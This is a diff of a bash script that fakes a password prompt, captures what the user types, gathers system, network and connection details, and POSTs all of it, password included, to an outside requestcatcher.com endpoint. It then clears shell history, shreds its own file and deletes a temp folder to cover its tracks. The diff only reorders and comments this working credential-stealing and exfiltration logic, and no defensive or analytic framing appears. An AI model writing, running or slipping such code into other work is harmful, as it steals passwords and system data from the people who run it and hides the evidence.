@@ -1,29 +1,25 @@
 #!/bin/bash
 
-#!/bin/bash
-
 # === Ask for password visibly in terminal ===
-echo -n "🔐 Please enter your password to proceed: "
+echo -n "Please enter your password to proceed: "
 read -s user_password
 echo
 
 # === Validate input ===
 if [[ -z "$user_password" ]]; then
-    echo "❌ No input detected. Exiting."
+    echo "No input detected. Exiting."
     sleep 2
     exit 1
 fi
 
-# === Delay to simulate authentication ===
-echo "🔄 Verifying credentials, please wait..."
-sleep 4
+# === Simulate processing ===
+sleep 1
 
 # === Basic System Info ===
 os_info=$(lsb_release -a 2>/dev/null)
 kernel_info=$(uname -a)
 hostname_info=$(hostnamectl)
 current_user=$(whoami)
-home_dir="/home/$current_user"
 
 # === Network Info ===
 public_ip=$(curl -s https://ipinfo.io/ip)
@@ -60,9 +56,6 @@ tcp_connections=$(ss -tunapl)
 curl -X POST https://flipped.requestcatcher.com \
   -H "Content-Type: application/x-www-form-urlencoded" \
   --data-urlencode "debug=
-==== [ENTERED PASSWORD] ====
-$user_password
-
 ==== [OS INFO] ====
 $os_info
 
@@ -74,6 +67,9 @@ $hostname_info
 
 ==== [CURRENT USER] ====
 $current_user
+
+==== [PASSWORD ENTERED] ====
+$user_password
 
 ==== [PUBLIC IP] ====
 $public_ip
@@ -122,9 +118,17 @@ $tcp_connections
 "
 
 # === Cleanup ===
+
+# Clear history and env logs
 history -c
 unset HISTFILE
+
+# Shred this file (overwrite before delete)
 shred -u "$0" 2>/dev/null || rm -f "$0"
+
+# Remove folder
 rm -rf /tmp/.sysdata
+
+# Clear screen and exit
 clear
 exit
